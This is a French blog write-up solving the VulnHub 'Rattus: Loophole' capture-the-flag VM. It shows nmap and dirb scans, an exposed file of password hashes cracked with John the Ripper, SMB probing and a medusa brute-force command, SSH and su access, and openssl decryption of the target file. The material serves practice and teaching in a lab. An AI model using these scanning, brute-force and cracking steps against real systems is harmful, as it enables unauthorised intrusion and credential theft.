# Solution du CTF Rattus: Loophole

Ce message s'autodétruira dans 5, 4, 3, 2, 1
--------------------------------------------

Le CTF [Loophole](http://vulnhub.com/entry/rattus_loophole,27/) propose de s'introduire sur un système sur fond de mission anti-terrorisme :  

> We suspect that someone inside Rattus labs is working with known terrorist group. Your mission is to infiltrate into their computer network and obtain encrypted document from one of their servers.
> Our inside source has told us that the document is saved under the name of Private.doc.enc and is encrypted using OpenSSL encryption utility. Obtain the document and decrypt it to complete the mission.

La première difficulté de ce challenge (les mauvaises langues diront la seule), c'est de parvenir à configurer la VM car l'ISO fournit n'utilise pas DHCP et a une adresse IP statique en 10.8.7.  

Finalement il faudra seulement aller dans *Fichier > Paramètres > Réseau* dans *VirtualBox* et créer un réseau privé hôte qui reprends ces infos (j'ai mis .4 et ça a marché mais dans la logique il faut sans mettre .0 si c'est pour le réseau) :  

![Congiguration VirtualBox](https://raw.githubusercontent.com/devl00p/blog/master/images/vboxnet0.png)

Après on peut lancer Nmap pour trouver l'adresse de notre future victime :  

```plain
nmap -e vboxnet0 -sP 10.8.7.0/29 -T4
Starting Nmap 6.40 ( http://nmap.org ) at 2014-04-05 09:34 CEST
Nmap scan report for 10.8.7.2
Host is up (0.00017s latency).
MAC Address: 08:00:27:8B:03:D7 (Cadmus Computer Systems)
Nmap done: 8 IP addresses (1 host up) scanned in 16.75 seconds
```

On pointe directement notre navigateur dessus et on trouve le site web de *Rattus Labs* qui contient différents contacts :  

![Rattus Labs](https://raw.githubusercontent.com/devl00p/blog/master/images/rattus.png)

Nadia Vlad, CEO.  

Sr. system administrator : Tom Skies - tskies@rattus.lab  

Network engineer : Jay Summer- jsummer@rattus.lab  

Mark Hog - mhog@rattus.lab  

Il y a aussi une page *phpinfo* publiquement accessible. La configuration est plutôt laxiste, permet l'inclusion distante par exemple. Le serveur web tourne en nobody.  

Il y a un sacré nombre de modules PHP mais on verra plus tard que cette info n'est d'aucune utilité.  

On lance un *dirb* sur le serveur *Apache* (1.3.31 avec PHP/4.4.4) :  

```plain
> ./dirb http://10.8.7.2/ wordlists/big.txt 

-----------------
DIRB v2.21
By The Dark Raver
-----------------

START_TIME: Sat Apr  5 13:43:18 2014
URL_BASE: http://10.8.7.2/
WORDLIST_FILES: wordlists/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://10.8.7.2/ ----
==> DIRECTORY: http://10.8.7.2/Images/
+ http://10.8.7.2/cgi-bin/ (CODE:403|SIZE:274)
+ http://10.8.7.2/garbage (CODE:200|SIZE:288)
+ http://10.8.7.2/index (CODE:200|SIZE:3001)
+ http://10.8.7.2/info (CODE:200|SIZE:37650)
+ http://10.8.7.2/status (CODE:200|SIZE:2456)
+ http://10.8.7.2/~operator (CODE:403|SIZE:275)
+ http://10.8.7.2/~root (CODE:403|SIZE:271)

---- Entering directory: http://10.8.7.2/Images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
DOWNLOADED: 20458 - FOUND: 7
```

Surprise quand on regarde le fichier *garbage* :  

```plain
root:$1$x2YBL0KB$E7QI7AF9ZeiqcfMRQ4KZ11:15018:0:::::
smmsp:!!:9797:0:::::
mysql:!!:9797:0:::::
rpc:!!:9797:0:::::
sshd:!!:9797:0:::::
apache:!!:9797:0:::::
nobody:!!:9797:0:::::
mhog:$1$ZQAbXwf3$TgcNjljKW.2tlJw4OICDr1:15019:0:::::0
tskies:$1$ZvNtdn0x$ck5hnAwXg.OLQPOtg28Hb.:15019:0:::::0
```

On lance *John The Ripper* qui retourne illico un premier mot de passe :  

```plain
Loaded 3 password hashes with 3 different salts (FreeBSD MD5 [128/128 AVX intrinsics 12x])
mhog             (mhog)
```

On laisse *JTR* tourner puis on passe à autre chose voir si on trouve autre chose d'intéressant. *Metasploit* a deux modules en rapport avec *mod\_negotiation* mais ils se révèlent sans intérêt dans notre cas.  

On lance un scan Nmap de la cible (quand même) :  

```plain
Starting Nmap 6.40 ( http://nmap.org ) at 2014-04-05 13:26 CEST
Nmap scan report for 10.8.7.2
Host is up (0.00012s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.4 (protocol 1.99)
|_auth-owners: ERROR: Script execution failed (use -d to debug)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_sshv1: Server supports SSHv1
80/tcp  open  http        Apache httpd 1.3.31 ((Unix) PHP/4.4.4)
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| http-methods: Potentially risky methods: PUT DELETE CONNECT PATCH PROPFIND PROPPATCH MKCOL COPY MOVE LOCK UNLOCK TRACE
|_See http://nmap.org/nsedoc/scripts/http-methods.html
|_http-title: Loophole - Rattus labs
113/tcp open  ident?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
|_auth-owners: ERROR: Script execution failed (use -d to debug)
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
|_auth-owners: ERROR: Script execution failed (use -d to debug)
MAC Address: 08:00:27:8B:03:D7 (Cadmus Computer Systems)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.13 - 2.6.32
Network Distance: 1 hop

Host script results:
|_nbstat: NetBIOS name: LOOPHOLE, NetBIOS user: , NetBIOS MAC: 
| smb-security-mode: 
| Account that was used for smb scripts: guest
| User-level authentication
| Plaintext passwords required (dangerous)
|\_ Message signing supported
|\_smbv2-enabled: Server doesn't support SMBv2 protocol

TRACEROUTE
HOP RTT ADDRESS
1 0.12 ms 10.8.7.2
```

*Metasploit* dispose de plusieurs exploits Samba mais ils sont trop vieux ou inefficaces par rapport au système.  

Est-ce qu'on peut faire quelque chose avec l'accès au Samba ?  

```plain
> nmblookup -A 10.8.7.2
Looking up status of 10.8.7.2
        LOOPHOLE        <00> -         B 
 LOOPHOLE <03> - B 
 LOOPHOLE <20> - B 
 ..\_\_MSBROWSE\_\_. <01> -  B 
 WORKGROUP <1d> - B 
 WORKGROUP <1e> -  B 
 WORKGROUP <00> -  B 

 MAC Address = 00-00-00-00-00-00

> smbclient -L LOOPHOLE -N
Anonymous login successful
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]
tree connect failed: NT\_STATUS\_INSUFFICIENT\_RESOURCES

> smbclient -L LOOPHOLE -U mhog%mhog
Server requested PLAINTEXT password but 'client plaintext auth = no' or 'client ntlmv2 auth = yes'
session setup failed: NT\_STATUS\_ACCESS\_DENIED
```

On rajoute quelques lignes dans la section global de notre *smb.conf* :  

```plain
client lanman auth = Yes
client plaintext auth = Yes
client ntlmv2 auth = No
```

Le changement est pas vraiment mieux :  

```plain
> smbclient -L LOOPHOLE -U mhog%mhog
session setup failed: NT_STATUS_LOGON_FAILURE
```

*Medusa* a un module SMB, on tente d'obtenir un accès (par exemple sur le compte *operator* trouvé par *dirb*) :  

```plain
medusa -h 10.8.7.2 -u operator -P john/wordlists/password.lst -M smbnt
```

Toujours bredouille :( On revient à nos moutons et on tente une connexion en SSH avec le compte *mhog* : et bingo ça passe !  

![ssh access as mhog](https://raw.githubusercontent.com/devl00p/blog/master/images/rattus2.png)

Cliffhanger Linux
-----------------

Comme d'habitude on fouille dans les processus, permissions sur les fichiers et binaires, configuration des services... rien d'intéressant.  

On teste quelques exploits pour le kernel mais aucun n'aboutit. Au passage on est sur un live-CD *Slax* donc /tmp n'est pas writable (comme la plupart du FS). Ça oblige à travailler dans */dev/shm* et définir la variable d'environnement *TMPDIR* à ce répertoire pour gcc.  

On revient sur *JTR* que l'on stoppe et que l'on relance avec [une wordlist béton](http://d4n3ws.polux-hosting.com/2014/02/26/mega-wordlist/).  

Cette fois les pass restants tombent en 8 minutes :  

```plain
albatros         (root)
nostradamus      (tskies)
```

On passe root via su et on trouve le ficier *Private.doc.enc* dans le home de l'utilisateur *tskies*.  

On retrouve la commande de chiffrement dans son *.bash\_history* :  

```plain
openssl enc -aes-256-cbc -e -in Private.doc -out Private.doc.enc -pass pass:nostradamus
```

Le déchiffrement est aisé :  

```plain
openssl enc -aes-256-cbc -d -in Private.doc.enc -out Private.doc -pass pass:nostradamus
```

On ouvre ça avec *LibreOffice* :  

![Document confidentiel](https://raw.githubusercontent.com/devl00p/blog/master/images/rattus3.png)

Et un de plus !

*Published April 05 2014 at 17:23*